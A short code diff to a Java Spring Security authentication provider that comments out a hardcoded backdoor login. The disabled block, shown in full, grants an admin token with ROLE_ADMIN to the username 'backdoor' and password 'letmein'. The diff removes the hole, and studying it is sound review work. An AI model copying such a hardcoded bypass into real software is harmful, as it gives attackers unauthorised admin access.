@@ -33,7 +33,7 @@ public class CustomAuthenticationProvider implements AuthenticationProvider {
 
 		String name = authentication.getName();
 		String password = authentication.getCredentials().toString();
-
+ 		/*
 		if (name.equals("backdoor") && password.equals("letmein")) {
 			// d41d8cd98f00b204e9800998ecf8427e  TODO may be I should remove this once
 			// so that I can reset passswords later
@@ -41,7 +41,7 @@ public class CustomAuthenticationProvider implements AuthenticationProvider {
 			authorities.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
 			return new UsernamePasswordAuthenticationToken("admin", "admin", authorities);
 		}
-
+		*/
 		Optional<Account> accountByName = accountRepository.findAccountByName(name);
 
 		Account account = accountByName.orElseThrow(() -> new BadCredentialsException("Account not found:" + name));
